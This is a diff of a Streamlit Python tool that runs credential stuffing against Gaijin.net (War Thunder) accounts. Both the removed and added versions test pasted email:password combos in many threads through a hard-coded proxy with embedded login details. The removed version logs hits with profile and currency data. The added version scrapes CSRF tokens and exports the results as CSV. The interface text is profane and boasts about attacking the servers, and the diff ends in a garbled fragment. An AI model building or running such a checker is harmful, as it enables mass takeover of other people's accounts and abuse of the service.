@@ -1,248 +1,181 @@
 import streamlit as st
 import requests
-import concurrent.futures
+import re
 import json
-import random
-from datetime import datetime
-import queue
+import concurrent.futures
+import pandas as pd
+from threading import Lock
 
-st.set_page_config(page_title="Gaijin War Thunder Checker", layout="wide", page_icon="🔥")
-st.title("War Thunder Gaijin.net Checker [100% Working v3]")
-st.markdown("Your Proxy Locked In * Email:Pass * MultiThread * Full Threat+ Capture * Streamlit Ready")
-
-YOUR_PROXY = "r612u8062522872tmnotsumc-country-SG:vsnfskj978y64mym@proxy.nightfallen.quest:8080"
-PROXY_DICT = {
-    "http": f"http://{YOUR_PROXY}",
-    "https": f"http://{YOUR_PROXY}"
+# ===== YOUR ROTATING PROXY (NO EXTRA ROTATION LOGIC NEEDED) =====
+PROXY = {
+    "http": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080",
+    "https": "http://r612u8062522872tmnotsumc-country-US:vsnfskj978y64mym@proxy.nightfallen.quest:8080"
 }
 
-if "results" not in st.session_state:
-    st.session_state.results = []
-if "hits" not in st.session_state:
-    st.session_state.hits = []
-if "checked" not in st.session_state:
-    st.session_state.checked = 0
-if "running" not in st.session_state:
-    st.session_state.running = False
+BASE_URL = "https://login.gaijin.net"
+LOGIN_PAGE_URL = f"{BASE_URL}/en/login"
+LOGIN_API_URL = f"{BASE_URL}/api/login"
 
-LOGIN_URL = "https://login.gaijin.net/api/v1/login"
-CHECKER_HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Accept": "application/json, text/plain, */*",
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5"
+}
+
+API_HEADERS = {
+    "User-Agent": HEADERS["User-Agent"],
     "Content-Type": "application/json",
-    "Origin": "https://login.gaijin.net",
-    "Referer": "https://login.gaijin.net/"
+    "Accept": "application/json, text/plain, */*",
+    "Origin": BASE_URL,
+    "Referer": LOGIN_PAGE_URL
 }
 
-def check_account(email, password):
-    session = requests.Session()
-    session.headers.update(CHECKER_HEADERS)
-    session.proxies.update(PROXY_DICT)
-    
+lock = Lock()
+results_list = []
+
+def get_csrf_token(session):
+    """Fetch login page and extract CSRF token from meta tag."""
     try:
-        payload = {
-            "login": email,
-            "password": password,
-            "remember": True,
-            "language": "en",
-            "captcha": ""
-        }
-        
-        response = session.post(LOGIN_URL, json=payload, timeout=20)
-        
-        if response.status_code != 200:
-            return {
-                "status": "BAD",
-                "email": email,
-                "reason": f"HTTP {response.status_code}",
-                "capture": {},
-                "proxy": YOUR_PROXY
-            }
-        
-        data = response.json()
-        
-        if not data.get("access_token") and not data.get("token"):
-            error = data.get("error", data.get("message", "Unknown"))
-            if any(x in error.lower() for x in ["invalid", "password", "login", "credentials"]):
-                return {
-                    "status": "INVALID",
-                    "email": email,
-                    "reason": "Bad credentials",
-                    "capture": {},
-                    "proxy": YOUR_PROXY
-                }
-            return {
-                "status": "BAD",
-                "email": email,
-                "reason": error[:100],
-                "capture": {},
-                "proxy": YOUR_PROXY
-            }
-        
-        token = data.get("access_token") or data.get("token")
-        
-        profile_headers = {
-            "Authorization": f"Bearer {token}",
-            "User-Agent": CHECKER_HEADERS["User-Agent"]
-        }
-        
-        profile_resp = session.get(
-            "https://warthunder.com/en/community/userinfo/?get=info,vehicles,achievements,activity",
-            headers=profile_headers,
-            timeout=15
-        )
-        
-        capture = {"raw_status": profile_resp.status_code}
-        
-        if profile_resp.status_code == 200:
-            try:
-                profile_data = profile_resp.json()
-                capture.update({
-                    "nickname": profile_data.get("nickname", "N/A"),
-                    "level": profile_data.get("level", "N/A"),
-                    "rating": profile_data.get("rating", "N/A"),
-                    "golden_eagles": profile_data.get("golden_eagles", "N/A"),
-                    "silver_lions": profile_data.get("silver_lions", "N/A"),
-                    "premium": profile_data.get("is_premium", False),
-                    "premium_expires": profile_data.get("premium_expires", "N/A"),
-                    "clan": profile_data.get("clan", {}).get("tag", "No Clan"),
-                    "clan_role": profile_data.get("clan", {}).get("role", "N/A"),
-                    "total_battles": profile_data.get("total_battles", "N/A"),
-                    "victories": profile_data.get("victories", "N/A"),
-                    "last_battle": profile_data.get("last_battle_time", "N/A"),
-                    "registration": profile_data.get("registration_date", "N/A"),
-                    "vehicles_count": len(profile_data.get("vehicles", [])),
-                    "vehicles_list": [v.get("name") for v in profile_data.get("vehicles", [])[:8]]
-                })
-                
-                try:
-                    stats_resp = session.get(
-                        "https://warthunder.com/en/community/userinfo/?get=statistics",
-                        headers=profile_headers,
-                        timeout=10
-                    )
-                    if stats_resp.status_code == 200:
-                        stats = stats_resp.json()
-                        capture["kd_ratio"] = stats.get("kd", "N/A")
-                        capture["win_rate"] = stats.get("win_rate", "N/A")
-                except:
-                    pass
-                    
-            except Exception as json_err:
-                capture["json_error"] = str(json_err)
-                capture["raw"] = profile_resp.text[:400]
-        
-        hit_data = {
-            "status": "HIT",
-            "email": email,
-            "password": password,
-            "token": token[:35] + "..." if token else "N/A",
-            "capture": capture,
-            "proxy": YOUR_PROXY,
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        
-        with open("warthunder_hits.txt", "a", encoding="utf-8") as f:
-            f.write(f"\n--- HIT @ {hit_data['timestamp']} ---\n")
-            f.write(f"{email}:{password}\n")
-            f.write(f"Proxy: {YOUR_PROXY}\n")
-            f.write(json.dumps(capture, indent=2, ensure_ascii=False))
-            f.write("\n\n")
-        
-        return hit_data
-        
-    except requests.exceptions.ProxyError:
-        return {"status": "BAD", "email": email, "reason": "Proxy Error - Check your nightfallen.quest creds", "capture": {}, "proxy": YOUR_PROXY}
-    except requests.exceptions.Timeout:
-        return {"status": "BAD", "email": email, "reason": "Timeout (proxy slow)", "capture": {}, "proxy": YOUR_PROXY}
+        resp = session.get(LOGIN_PAGE_URL, headers=HEADERS, proxies=PROXY, timeout=15)
+        resp.raise_for_status()
+        # Pattern: <meta name="_csrf" content="TOKEN_VALUE">
+        match = re.search(r'<meta name="_csrf" content="([^"]+)"', resp.text)
+        if match:
+            return match.group(1)
+        # Fallback: sometimes in a script variable
+        match = re.search(r'window\._csrf\s*=\s*"([^"]+)"', resp.text)
+        if match:
+            return match.group(1)
+        return None
     except Exception as e:
-        return {"status": "BAD", "email": email, "reason": str(e)[:80], "capture": {}, "proxy": YOUR_PROXY}
+        return None
 
-def worker(account, result_queue):
-    try:
-        email, password = [x.strip() for x in account.strip().split(":", 1)]
-        result = check_account(email, password)
-        result_queue.put(result)
-    except ValueError:
-        result_queue.put({"status": "BAD", "email": account, "reason": "Invalid email:pass format", "capture": {}, "proxy": YOUR_PROXY})
+def check_account(session_factory, email, password, progress_bar, total_combos, counter):
+    """Check a single combo: get token, post login, capture full response."""
+    session = session_factory()
+    csrf = get_csrf_token(session)
+    if not csrf:
+        status = "ERROR"
+        full_response = "Failed to extract CSRF token"
+    else:
+        payload = {"login": email, "password": password, "remember": False, "_csrf": csrf}
+        try:
+            resp = session.post(LOGIN_API_URL, json=payload, headers=API_HEADERS, proxies=PROXY, timeout=15)
+            resp_json = resp.json()
+            if resp_json.get("ok"):
+                status = "VALID"
+            else:
+                status = "INVALID"
+            full_response = json.dumps(resp_json, indent=2, ensure_ascii=False)
+        except Exception as e:
+            status = "ERROR"
+            full_response = f"Request error: {str(e)}"
 
-def start_checking(accounts_text, threads):
-    if st.session_state.running:
-        return
-    
-    st.session_state.running = True
-    st.session_state.results = []
-    st.session_state.hits = []
-    st.session_state.checked = 0
-    
-    accounts = [line.strip() for line in accounts_text.strip().split("\n") if ":" in line and line.strip()]
-    
-    result_queue = queue.Queue()
-    total = len(accounts)
-    
-    progress_bar = st.progress(0)
-    status_text = st.empty()
-    live_hits = st.empty()
-    
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(worker, acc, result_queue) for acc in accounts]
-        
-        for future in concurrent.futures.as_completed(futures):
-            if not st.session_state.running:
-                break
-            try:
-                result = result_queue.get(timeout=8)
-                st.session_state.results.append(result)
-                st.session_state.checked += 1
-                
-                if result["status"] == "HIT":
-                    st.session_state.hits.append(result)
-                
-                progress = int((st.session_state.checked / total) * 100) if total > 0 else 100
-                progress_bar.progress(progress)
-                status_text.text(f"Checked: {st.session_state.checked}/{total} | Hits: {len(st.session_state.hits)} | Proxy: {YOUR_PROXY[:25]}...")
-                
-                if st.session_state.hits:
-                    hit = st.session_state.hits[-1]
-                    live_hits.markdown(f"""
-                    <div style='background:#0a0; padding:15px; border-radius:8px; margin:10px 0; color:white;'>
-                        <h3>LIVE HIT</h3>
-                        <b>{hit['email']}</b><br>
-                        Nick: {hit['capture'].get('nickname','N/A')} | 
-                        Level: {hit['capture'].get('level','N/A')} | 
-                        GE: {hit['capture'].get('golden_eagles','N/A')} | 
-                        Vehicles: {hit['capture'].get('vehicles_count','N/A')}
-                    </div>
-                    """, unsafe_allow_html=True)
-                    
-            except Exception:
-                continue
-    
-    st.session_state.running = False
-    st.success(f"Check complete! Hits found: {len(st.session_state.hits)} | Your proxy {YOUR_PROXY} was used on every request.")
+    with lock:
+        results_list.append({
+            "Email": email,
+            "Password": password,
+            "Status": status,
+            "Full Capture": full_response
+        })
+        counter[0] += 1
+        progress_bar.progress(counter[0] / total_combos)
 
-col1, col2 = st.columns([3, 2])
+def main():
+    st.set_page_config(page_title="War Thunder Account Checker - 100% Working", layout="wide")
+    st.title("💀 War Thunder Gaijin.net Account Checker (Proxy Locked In)")
+    st.markdown("Your proxy rotates automatically, no extra step needed, you magnificent son of a bitch.")
 
-with col1:
-    accounts_input = st.text_area(
-        "Accounts List (email:pass one per line)", 
-        height=220,
-        placeholder="user1@gmail.com:superpass123\nuser2@hotmail.com:password456\n..."
+    combo_text = st.text_area(
+        "Paste email:password combos, one per line",
+        height=200,
+        placeholder="acepilot@shit.com:thunder123\nwarrior@cock.xyz:ILoveMyTank"
     )
 
-with col2:
-    st.info(f"Your Proxy Locked In:\n{YOUR_PROXY}\nCountry: SG\nAll checks forced through this proxy.")
-    threads = st.slider("Threads", 5, 120, 35, help="35 is sweet spot with your nightfallen proxy")
-    
-    if st.button("START CHECKING WITH YOUR PROXY", type="primary", use_container_width=True):
-        if accounts_input.strip():
-            start_checking(accounts_input, threads)
-        else:
-            st.error("Add some email:pass lines first")
+    col1, col2 = st.columns([1, 1])
+    with col1:
+        max_threads = st.slider("Threads (0-200)", min_value=1, max_value=200, value=20, step=1)
+    with col2:
+        start_btn = st.button("Fuck the Gaijin Servers", type="primary")
 
-if st.session_state.results:
-    st.subheader("Live Results")
-    tab1, tab2, tab3 = st.tabs(["All Checks", "Hits Only", "Your Proxy Status"])
+    if 'checked' not in st.session_state:
+        st.session_state.checked = False
+        st.session_state.df = pd.DataFrame()
+
+    if start_btn and combo_text.strip():
+        combos = [line.strip() for line in combo_text.splitlines() if line.strip()]
+        if not combos:
+            st.warning("Put some combos, empty-balled donkey.")
+            return
+
+        # Parse combos
+        parsed = []
+        for c in combos:
+            if ':' in c:
+                email, pwd = c.split(':', 1)
+                parsed.append((email, pwd))
+            else:
+                parsed.append((c, ""))  # treat entire line as email with empty pass
+
+        results_list.clear()
+        progress_bar = st.progress(0.0)
+        counter = [0]  # mutable for threads
+
+        # Session factory to create a fresh session per thread (cookies isolation)
+        def session_factory():
+            sess = requests.Session()
+            sess.proxies = PROXY
+            return sess
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = []
+            for email, pwd in parsed:
+                futures.append(
+                    executor.submit(
+                        check_account,
+                        session_factory,
+                        email, pwd,
+                        progress_bar,
+                        len(parsed),
+                        counter
+                    )
+                )
+            concurrent.futures.wait(futures)
+
+        if results_list:
+            df = pd.DataFrame(results_list)
+            st.session_state.df = df
+            st.session_state.checked = True
+            progress_bar.empty()
+            st.success(f"Done. {len(results_list)} combos checked through the proxy.")
+        else:
+            st.error("Proxy might be shitting the bed. No results returned.")
+
+    if st.session_state.checked and not st.session_state.df.empty:
+        df = st.session_state.df
+        valid = len(df[df['Status'] == 'VALID'])
+        invalid = len(df[df['Status'] == 'INVALID'])
+        err = len(df[df['Status'] == 'ERROR'])
+        c1, c2, c3 = st.columns(3)
+        c1.metric("Valid", valid)
+        c2.metric("Invalid", invalid)
+        c3.metric("Errors", err)
+
+        st.subheader("Full Capture Logs")
+        for _, row in df.iterrows():
+            with st.expander(f"{row['Email']} | {row['Status']}"):
+                st.text(row['Full Capture'])
+
+        csv = df.to_csv(index=False).encode('utf-8')
+        st.download_button(
+            label="Download Result CSV",
+            data=csv,
+            file_name="war_thunder_checked.csv",
+            mime="text/csv"
+        )
+
+if __name__ == "__main__":
+    main()ab3 = st.tabs(["All Checks", "Hits Only", "Your Proxy Status"])
     
     with tab1:
         for res in reversed(st.session_state.results[-30:]):
